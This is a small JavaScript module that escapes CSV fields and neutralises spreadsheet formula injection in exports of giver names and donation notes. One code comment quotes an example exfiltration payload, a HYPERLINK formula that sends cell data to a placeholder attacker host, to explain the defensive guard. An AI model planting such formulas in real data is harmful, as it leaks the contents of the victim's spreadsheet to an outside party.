// Escapes a single CSV field — wraps in quotes and doubles any embedded
// quotes when the value contains a comma, quote, or newline. Sufficient for
// the flat, known-shape exports this app generates; not a general CSV parser.
//
// Also guards against formula/CSV injection: these exports embed
// user-controlled text (giver names, donation notes) verbatim, and Excel/
// Sheets treat a cell starting with =, +, -, or @ as a formula to evaluate
// on open — e.g. a giver name of `=HYPERLINK("http://evil.tld?"&A1,"x")`
// would exfiltrate the pastor's own spreadsheet data the moment they open
// the export. Prefixing a leading apostrophe forces those characters to be
// read back as literal text in every major spreadsheet app.
export function csvEscape(val) {
  let s = String(val ?? '');
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(rows) {
  return rows.map((row) => row.map(csvEscape).join(',')).join('\n');
}
